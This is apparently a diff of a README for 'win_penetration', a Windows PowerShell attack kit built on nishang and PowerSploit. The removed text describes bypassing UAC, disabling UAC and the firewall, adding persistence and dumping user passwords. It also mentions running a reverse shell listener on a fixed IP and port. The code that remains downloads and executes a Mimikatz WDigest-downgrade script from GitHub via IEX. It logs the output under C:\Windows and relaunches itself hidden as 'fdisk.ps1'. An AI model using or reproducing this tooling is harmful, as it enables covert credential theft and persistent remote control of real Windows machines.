@@ -1,21 +1,3 @@
-# win_penetration
-
-powered by [nishang](https://github.com/samratashok/nishang), [PowerSploit](https://github.com/mattifestation/PowerSploit)
-
-### main behaviour
-- bypass UAC and extract payload to tmp directory
-- run the payload script
-    - add powershell root path to env path
-	- copy self to temp path and powershell root path
-    - turn of the LUA and firewall
-	- add persistence
-	- register self to auto-run
-	- dump login user password
-	- run PowerShellTcp listenning on 192.168.10.99:8099
-
-
-### 1.ps1
-```
 # add powershell root path to env path
 $Env:path=$Env:Path+";C:\Windows\System32\WindowsPowerShell\v1.0\"  
 
@@ -48,8 +30,7 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 		# // File does not exist
 		IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1')
 		Invoke-MimikatzWDigestDowngrade
-		Get-Job | Receive-Job | Out-File c:\windows\zzzjob.log
-		get-job | wait-job
+		Get-Job | Receive-Job | Out-File c:\windows\zacount.log
 	}
 
 
@@ -71,5 +52,3 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 } else {
 	powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File $env:temp\fdisk.ps1
 }
-
-```
